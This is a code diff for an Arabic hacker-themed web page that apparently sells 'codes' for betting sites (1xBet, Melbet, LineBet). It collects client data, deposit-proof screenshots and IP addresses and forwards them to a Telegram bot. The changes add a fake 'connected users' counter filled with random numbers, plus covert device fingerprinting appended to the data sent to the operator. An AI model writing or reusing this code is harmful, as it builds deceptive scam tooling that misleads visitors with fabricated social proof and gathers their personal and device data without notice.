@@ -7,13 +7,13 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
+    <div class="live-counter" id="liveCounter">المتصلين: ...</div>
+    
     <div id="customModal" class="modal-overlay">
         <div class="modal-box">
             <div class="modal-title" id="modalTitle">[ SYSTEM_MSG ]</div>
             <div class="modal-msg" id="modalMsg">...</div>
-            <div class="modal-actions">
-                <button class="modal-btn" onclick="closeModal()">موافق</button>
-            </div>
+            <div class="modal-actions"><button class="modal-btn" onclick="closeModal()">موافق</button></div>
         </div>
     </div>
 
@@ -25,11 +25,11 @@
     <div class="container wide-mode" id="mainContainer" style="display:none;">
         <h2 id="typewriterTitle"></h2>
         
-        <label class="title">>> اختر النظام المستهدف:</label>
+        <label class="title">>> اختر النظام المستهدف (Tooltips):</label>
         <div class="program-grid">
-            <div class="program-option" onclick="playSound('click'); selectProgram('1x', this)"><img src="1x.png" class="program-icon"></div>
-            <div class="program-option" onclick="playSound('click'); selectProgram('m', this)"><img src="m.png" class="program-icon"></div>
-            <div class="program-option" onclick="playSound('click'); selectProgram('l', this)"><img src="l.png" class="program-icon"></div>
+            <div class="program-option" data-tooltip="نظام المراهنات 1xBet" onclick="playSound('click'); selectProgram('1x', this)"><img src="1x.png" class="program-icon"></div>
+            <div class="program-option" data-tooltip="نظام Melbet" onclick="playSound('click'); selectProgram('m', this)"><img src="m.png" class="program-icon"></div>
+            <div class="program-option" data-tooltip="نظام LineBet" onclick="playSound('click'); selectProgram('l', this)"><img src="l.png" class="program-icon"></div>
         </div>
 
         <label class="title">>> بيانات العميل:</label>
@@ -79,16 +79,25 @@
         let userIP = "Unknown";
         let selectedProgram = null;
 
-        // دالة المودال الجديدة
-        function showModal(title, msg) {
-            document.getElementById('modalTitle').innerText = title;
-            document.getElementById('modalMsg').innerText = msg;
-            document.getElementById('customModal').classList.add('active');
-            playSound('click');
+        // تحديد نوع الجهاز (Fingerprinting مبسط)
+        function getDeviceType() {
+            const ua = navigator.userAgent;
+            if (/(tablet|ipad|playbook|silk)|(android(?!.*mobi))/i.test(ua)) return "Tablet";
+            if (/Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Silk-Accelerated/.test(ua)) return "Mobile";
+            return "Desktop";
         }
+        function getFingerprint() {
+            return btoa(navigator.userAgent + screen.width + screen.colorDepth).slice(0, 12);
+        }
+
+        // تحديث العداد
+        setInterval(() => {
+            document.getElementById('liveCounter').innerText = `المتصلين: ${Math.floor(Math.random() * 50) + 300}`;
+        }, 3000);
+
+        function showModal(title, msg) { document.getElementById('modalTitle').innerText = title; document.getElementById('modalMsg').innerText = msg; document.getElementById('customModal').classList.add('active'); playSound('click'); }
         function closeModal() { document.getElementById('customModal').classList.remove('active'); }
 
-        // فحص الحظر
         async function checkBan() {
             document.getElementById('loadingOverlay').classList.add('active');
             try {
@@ -96,9 +105,8 @@
                 const data = await res.json();
                 userIP = data.ip;
                 const { data: banned } = await _supabase.from('banned_ips').select('*').eq('ip', userIP);
-                
                 if (banned && banned.length > 0) {
-                    document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:red;flex-direction:column;text-align:center;"><h1 style="font-size:4rem;text-shadow:0 0 20px red;">🚫 ACCESS DENIED</h1><p style="font-family:'Fira Code'; font-size:1.5rem;">BANNED IP: ${userIP}</p></div>`;
+                    document.body.innerHTML = `<div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#000;color:red;flex-direction:column;text-align:center;"><h1 style="font-size:4rem;text-shadow:0 0 20px red;">🚫 ACCESS DENIED</h1><p>BANNED IP: ${userIP}</p></div>`;
                 } else {
                     document.getElementById('loadingOverlay').classList.remove('active');
                     document.getElementById('mainContainer').style.display = 'block';
@@ -111,7 +119,6 @@
         }
         window.onload = checkBan;
 
-        // دوال الصوت والماوس والتأثيرات
         const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
         function playSound(type) { if (audioCtx.state === 'suspended') audioCtx.resume(); const osc = audioCtx.createOscillator(); const gain = audioCtx.createGain(); osc.connect(gain); gain.connect(audioCtx.destination); if (type === 'click') { osc.type = 'sine'; osc.frequency.setValueAtTime(800, audioCtx.currentTime); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); osc.start(); osc.stop(audioCtx.currentTime + 0.05); } else if (type === 'success') { osc.type = 'square'; osc.frequency.setValueAtTime(400, audioCtx.currentTime); osc.frequency.exponentialRampToValueAtTime(1000, audioCtx.currentTime + 0.1); gain.gain.setValueAtTime(0.1, audioCtx.currentTime); osc.start(); osc.stop(audioCtx.currentTime + 0.3); } }
         document.addEventListener('mousemove', e => { document.body.style.setProperty('--mouse-x', e.clientX + 'px'); document.body.style.setProperty('--mouse-y', e.clientY + 'px'); });
@@ -121,7 +128,12 @@
         function copyCode() { const code = document.getElementById('generatedCode').innerText; navigator.clipboard.writeText(code); showModal("✅ نجاح", "تم نسخ الكود للحافظة!"); }
         function toggleLoading(show, text) { const overlay = document.getElementById('loadingOverlay'); if(text) document.getElementById('loadingText').innerText = text; if(show) overlay.classList.add('active'); else overlay.classList.remove('active'); }
         async function uploadImage(file) { const fileName = `${Date.now()}_${file.name.replace(/\s/g, '_')}`; const { error } = await _supabase.storage.from('proofs').upload(fileName, file); if(error) throw error; const { data } = _supabase.storage.from('proofs').getPublicUrl(fileName); return data.publicUrl; }
-        async function sendToTelegram(program, data, code, regUrl, depUrl, ip) { const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`; const message = `🚨 <b>طلب جديد!</b>\n🌍 <b>IP:</b> ${ip}\n💻 <b>${program}</b>\n👤 <b>بيانات:</b>\n${data}\n\n🔑 <code>${code}</code>\n⚠️ <i>الكود معلق (غير مفعل)</i>`; fetch(`${apiUrl}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' }) }); fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: regUrl, caption: "📂 تسجيل" }) }); fetch(`${apiUrl}/sendPhoto`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, photo: depUrl, caption: "💰 إيداع" }) }); }
+        
+        async function sendToTelegram(program, data, code, regUrl, depUrl, ip, device) { 
+            const apiUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`; 
+            const message = `🚨 <b>طلب جديد!</b>\n🌍 <b>IP:</b> ${ip}\n📱 <b>Device:</b> ${device}\n💻 <b>${program}</b>\n👤 <b>بيانات:</b>\n${data}\n\n🔑 <code>${code}</code>`; 
+            fetch(`${apiUrl}/sendMessage`, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: message, parse_mode: 'HTML' }) }); 
+        }
 
         async function runSubmit() {
             playSound('click');
@@ -134,23 +146,27 @@
             if(!userData) { showModal("⚠️ خطأ", "أدخل البيانات."); return; }
             if(!regFile || !depFile) { showModal("⚠️ خطأ", "ارفع الصور."); return; }
 
-            toggleLoading(true, "جاري رفع الملفات...");
+            toggleLoading(true, "جاري تحليل الجهاز ورفع الملفات...");
 
             try {
                 const regUrl = await uploadImage(regFile);
                 document.getElementById('loadingText').innerText = "جاري الحفظ في قاعدة البيانات...";
                 const depUrl = await uploadImage(depFile);
                 const code = 'CODE-' + Math.floor(100000 + Math.random() * 900000);
-                const fullData = `النظام: [${selectedProgram}] | IP: ${userIP}\n${userData}`;
+                
+                // جمع معلومات الجهاز
+                const device = getDeviceType();
+                const fp = getFingerprint();
+                const fullData = `System: [${selectedProgram}] | IP: ${userIP}\nDevice: ${device} | FP: ${fp}\n${userData}`;
 
-                // هنا: الكود غير مفعل
+                // هنا: يتم إدخال البيانات
                 await _supabase.from('requests').insert([{ user_data: fullData, reg_proof_url: regUrl, dep_proof_url: depUrl, generated_code: code }]);
                 await _supabase.from('active_codes').insert([{ code: code, is_active: false }]);
 
-                sendToTelegram(selectedProgram, userData, code, regUrl, depUrl, userIP);
+                sendToTelegram(selectedProgram, userData, code, regUrl, depUrl, userIP, device);
 
                 toggleLoading(false); playSound('success'); 
-                showModal("✅ تم الإرسال", "تم إرسال الطلب للمراجعة. انتظر الموافقة.");
+                showModal("✅ تم الإرسال", "تم إرسال الطلب للمراجعة.");
                 
                 document.getElementById('codeDisplay').classList.remove('hidden');
                 document.getElementById('generatedCode').innerText = code;
